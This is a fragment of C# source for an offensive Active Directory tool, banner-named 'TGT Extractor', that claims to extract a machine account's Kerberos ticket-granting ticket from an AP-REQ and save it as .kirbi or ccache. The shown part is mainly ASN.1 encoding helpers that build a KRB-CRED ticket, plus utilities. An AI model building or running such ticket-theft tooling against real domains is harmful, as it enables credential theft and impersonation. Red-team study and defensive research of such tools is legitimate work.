        byte[] msgtypeBytes = new byte[msgtypeEnd - msgtypeStart];
        Buffer.BlockCopy(krbCred, pvnoStart, pvnoBytes, 0, pvnoBytes.Length);
        Buffer.BlockCopy(krbCred, msgtypeStart, msgtypeBytes, 0, msgtypeBytes.Length);

        // SEQUENCE body
        byte[] seqBody = Concat(pvnoBytes, msgtypeBytes, ticketBytes, encPartCtx);
        byte[] seq = EncodeSequence(seqBody);

        // [APPLICATION 22] wrapper  (tag = 0x76)
        byte[] result = EncodeApplication(22, seq);

        return result;
    }

    // ── Minimal ASN.1 encoder helpers ─────────────────────────────────────────

    static byte[] EncodeLength(int len)
    {
        if (len < 0x80) return new byte[] { (byte)len };
        if (len < 0x100) return new byte[] { 0x81, (byte)len };
        return new byte[] { 0x82, (byte)(len >> 8), (byte)(len & 0xFF) };
    }

    static byte[] EncodeSequence(byte[] content)
    {
        return Concat(new byte[] { 0x30 }, EncodeLength(content.Length), content);
    }

    static byte[] EncodeApplication(int n, byte[] content)
    {
        byte tag = (byte)(0x60 | n); // APPLICATION CONSTRUCTED
        return Concat(new byte[] { tag }, EncodeLength(content.Length), content);
    }

    static byte[] EncodeContext(int n, byte[] content)
    {
        byte tag = (byte)(0xa0 | n); // CONTEXT CONSTRUCTED
        return Concat(new byte[] { tag }, EncodeLength(content.Length), content);
    }

    static byte[] EncodeContextInt(int contextTag, int value)
    {
        // Build INTEGER bytes (minimal encoding, big-endian)
        byte[] intBytes;
        if (value == 0) intBytes = new byte[] { 0x00 };
        else
        {
            var tmp = new System.Collections.Generic.List<byte>();
            int v = value;
            while (v != 0) { tmp.Insert(0, (byte)(v & 0xFF)); v >>= 8; }
            if ((tmp[0] & 0x80) != 0) tmp.Insert(0, 0x00); // sign byte
            intBytes = tmp.ToArray();
        }
        byte[] intTlv = Concat(new byte[] { 0x02 }, EncodeLength(intBytes.Length), intBytes);
        return EncodeContext(contextTag, intTlv);
    }

    static byte[] EncodeContextOctet(int contextTag, byte[] data)
    {
        byte[] octetTlv = Concat(new byte[] { 0x04 }, EncodeLength(data.Length), data);
        return EncodeContext(contextTag, octetTlv);
    }

    static byte[] Concat(params byte[][] arrays)
    {
        int total = 0;
        foreach (var a in arrays) total += a.Length;
        byte[] result = new byte[total];
        int pos = 0;
        foreach (var a in arrays) { Buffer.BlockCopy(a, 0, result, pos, a.Length); pos += a.Length; }
        return result;
    }

    // ── ASN.1 helpers ─────────────────────────────────────────────────────────

    static void SkipTag(byte[] data, ref int pos) { pos++; }

    static int ReadLength(byte[] data, ref int pos)
    {
        int b = data[pos++];
        if ((b & 0x80) == 0) return b;
        int count = b & 0x7F;
        int len = 0;
        for (int i = 0; i < count; i++)
            len = (len << 8) | data[pos++];
        return len;
    }

    static int ReadInt(byte[] data, ref int pos, int len)
    {
        int val = 0;
        for (int i = 0; i < len; i++)
            val = (val << 8) | data[pos++];
        return val;
    }

    // ── Utility ───────────────────────────────────────────────────────────────

    static int SearchBytes(byte[] haystack, byte[] needle)
    {
        for (int i = 0; i <= haystack.Length - needle.Length; i++)
        {
            bool found = true;
            for (int j = 0; j < needle.Length; j++)
                if (haystack[i + j] != needle[j]) { found = false; break; }
            if (found) return i;
        }
        return -1;
    }

    static string EtypeToString(int etype)
    {
        switch (etype)
        {
            case 1: return "DES-CBC-CRC";
            case 3: return "DES-CBC-MD5";
            case 17: return "AES128-CTS-HMAC-SHA1-96";
            case 18: return "AES256-CTS-HMAC-SHA1-96";
            case 23: return "RC4-HMAC";
            case 24: return "RC4-HMAC-EXP";
            default: return "UNKNOWN-" + etype;
        }
    }

    static void Banner()
    {
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine();
        Console.WriteLine(@"______________________________ ___________         __                        __                ");
        Console.WriteLine(@"\__    ___/  _____/\__    ___/ \_   _____/__  ____/  |_____________    _____/  |_  ___________ ");
        Console.WriteLine(@"  |    | /   \  ___  |    |     |    __)_\  \/  /\   __\_  __ \__  \ _/ ___\   __\/  _ \_  __ \");
        Console.WriteLine(@"  |    | \    \_\  \ |    |     |        \>    <  |  |  |  | \// __ \\  \___|  | (  <_> )  | \/");
        Console.WriteLine(@"  |____|  \______  / |____|    /_______  /__/\_ \ |__|  |__|  (____  /\___  >__|  \____/|__|   ");
        Console.WriteLine(@"                 \/                    \/      \/                  \/     \/                   ");
        Console.ResetColor();
        Console.ForegroundColor = ConsoleColor.DarkGray;
        Console.WriteLine();
        Console.WriteLine("  Extracts Machine Account TGT from AP-REQ using Session Key");
        Console.WriteLine("  Code is Borrowed from awesome tool <3 Rubeus <3");
        Console.WriteLine("  Output:  Base64 (.kirbi)  |  MIT ccache (.ccache)");
        Console.WriteLine();
        Console.WriteLine("  " + new string('-', 55));
        Console.ResetColor();
        Console.WriteLine();
    }
}
